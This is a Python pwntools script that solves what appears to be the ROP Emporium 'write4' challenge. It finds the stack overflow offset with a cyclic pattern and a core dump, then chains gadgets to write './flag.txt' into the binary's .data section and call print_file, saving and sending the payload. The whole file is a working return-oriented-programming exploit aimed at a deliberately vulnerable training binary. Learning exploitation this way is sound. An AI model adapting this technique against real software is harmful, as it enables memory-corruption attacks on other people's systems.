import pwn

REGISTER_SIZE = 8
move_r15_to_r14_addr = pwn.p64(0x400628) # mov qword ptr [r14], r15; ret

def write_in_memory(rop, addr, data, offset=0):
    rop.raw(rop.find_gadget(['pop r14', 'pop r15', 'ret']))
    rop.raw(addr + offset)
    rop.raw(data[:REGISTER_SIZE].ljust(REGISTER_SIZE, '\0'))
    rop.raw(move_r15_to_r14_addr)
    if len(data) > REGISTER_SIZE:
        if (diff := len(data) - REGISTER_SIZE) < REGISTER_SIZE:
            write_in_memory(rop, addr, data[diff:], offset + diff)
        else:
            write_in_memory(rop, addr, data[REGISTER_SIZE:], offset + REGISTER_SIZE)

class Exploit:
    def __init__(self, path):
        self.path = path
        pwn.context.log_level = 'warning'
        pwn.context.binary = pwn.ELF(path)

    def find_offset(self):
        pwn.warning("Starting test process to find buffer size...")
        process = pwn.process(self.path)
        de_bruijn = pwn.cyclic(128)
        process.sendline(de_bruijn)
        process.wait()
        core = process.corefile
        stack = core.rsp # rsp (x64) / esp (x86)
        self.offset = de_bruijn.find(core.read(stack, 4)) # -4 on x86 ONLY
        pwn.warning(f"Found pattern at offset {self.offset}")

    def craft_payload(self):
        pwn.warning("Crafting payload...")
        elf = pwn.ELF(self.path)
        rop = pwn.ROP(elf)

        addr = elf.get_section_by_name('.data').header.sh_addr # + elf.address
        write_in_memory(rop, addr, "./flag.txt\0")
        rop.call(elf.plt["print_file"], [addr])
        self.payload = pwn.flat({self.offset: rop.chain()})

        pwn.warning(f"Writing crafted payload ({len(self.payload)} bytes) in payload.txt...")
        with open("payload.txt", "wb+") as fd:
            fd.write(self.payload)

    def exploit(self):
        pwn.warning("Starting final process for exploitation...")
        process = pwn.process(self.path)
        pwn.atexit.register(process.clean_and_log)
        process.sendline(self.payload)
        pwn.warning(process.recvallS())


exploit = Exploit("./write4")
exploit.find_offset()
exploit.craft_payload()
exploit.exploit()
